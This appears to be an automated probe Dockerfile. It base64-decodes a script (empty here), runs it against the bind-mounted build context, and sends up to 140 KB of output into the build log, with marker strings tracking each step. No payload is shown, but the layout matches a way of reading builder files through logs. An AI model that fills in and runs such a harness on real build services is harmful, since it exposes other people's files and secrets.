# MARK-I68222-ts4-5b8d1
FROM alpine:3.20
RUN echo MARK-I68222-start
RUN apk add --no-cache python3 >/dev/null 2>&1; echo APKDONE
RUN echo '' > /p.b64
RUN echo '' >> /p.b64
RUN base64 -d /p.b64 > /p.py && python3 -c "import ast;ast.parse(open('/p.py').read());print('PYOK')"
RUN --mount=type=bind,source=.,target=/H,ro sh -c 'python3 /p.py 2>&1 | head -c 140000'
RUN echo MARK-I68222-done-5b8d1
CMD ["sh","-c","sleep 10"]
